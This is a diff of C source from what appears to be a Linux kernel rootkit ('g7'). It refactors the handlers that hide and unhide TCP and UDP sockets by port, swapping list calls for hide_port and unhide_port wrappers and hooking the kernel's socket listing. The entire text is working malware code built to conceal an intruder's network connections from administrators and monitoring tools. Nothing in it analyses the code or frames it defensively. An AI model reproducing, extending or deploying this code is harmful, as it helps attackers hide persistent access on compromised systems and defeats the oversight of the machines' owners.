@@ -191,8 +191,8 @@ handle_tcphide(unsigned long arg)
         unhook_show();
         DEBUG_NOTICE("[g7] socket hiding off\n");
     } else if (sarg < 0) {
-        remove_port_from_list(&hidden_ports, (port_t)-sarg, tcp4);
-        remove_port_from_list(&hidden_ports, (port_t)-sarg, tcp6);
+        unhide_port((port_t)-sarg, tcp4);
+        unhide_port((port_t)-sarg, tcp6);
         DEBUG_NOTICE("[g7] unhiding tcp socket with port %ld\n", -sarg);
     } else if (sarg > 0) {
         if (!rootkit.hiding_sockets) {
@@ -200,8 +200,8 @@ handle_tcphide(unsigned long arg)
             DEBUG_NOTICE("[g7] socket hiding on\n");
         }
 
-        add_port_to_list(&hidden_ports, (port_t)sarg, tcp4);
-        add_port_to_list(&hidden_ports, (port_t)sarg, tcp6);
+        hide_port((port_t)sarg, tcp4);
+        hide_port((port_t)sarg, tcp6);
         DEBUG_NOTICE("[g7] hiding tcp socket with port %ld\n", sarg);
     }
 
@@ -218,16 +218,16 @@ handle_udphide(unsigned long arg)
         rootkit.hiding_sockets = 0;
         DEBUG_NOTICE("[g7] socket hiding off\n");
     } else if (sarg < 0) {
-        remove_port_from_list(&hidden_ports, (port_t)-sarg, udp4);
-        remove_port_from_list(&hidden_ports, (port_t)-sarg, udp6);
+        unhide_port((port_t)-sarg, udp4);
+        unhide_port((port_t)-sarg, udp6);
         DEBUG_NOTICE("[g7] unhiding udp socket with port %ld\n", -sarg);
     } else if (sarg > 0) {
         if (!rootkit.hiding_sockets) {
             hook_show();
             DEBUG_NOTICE("[g7] socket hiding on\n");
         }
-        add_port_to_list(&hidden_ports, (port_t)sarg, udp4);
-        add_port_to_list(&hidden_ports, (port_t)sarg, udp6);
+        hide_port((port_t)sarg, udp4);
+        hide_port((port_t)sarg, udp6);
         DEBUG_NOTICE("[g7] hiding udp socket with port %ld\n", sarg);
     }
 
